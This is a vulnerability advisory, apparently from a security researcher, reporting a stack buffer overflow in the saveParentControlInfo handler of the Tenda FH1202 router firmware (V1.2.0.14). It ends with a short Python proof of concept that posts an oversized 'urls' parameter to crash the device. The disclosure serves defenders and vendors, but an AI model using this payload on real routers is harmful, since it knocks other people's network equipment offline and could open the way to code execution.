## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The function `saveParentControlInfo` contains a stack-based buffer overflow vulnerability.

![image-20240319223326387](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223326387.png)

it reads in a user-provided parameter `urls`, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer.

![image-20240319223307458](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223307458.png)

As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

![image-20240319223317455](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223317455.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000

data = {"urls": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319223442316](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223442316.png)
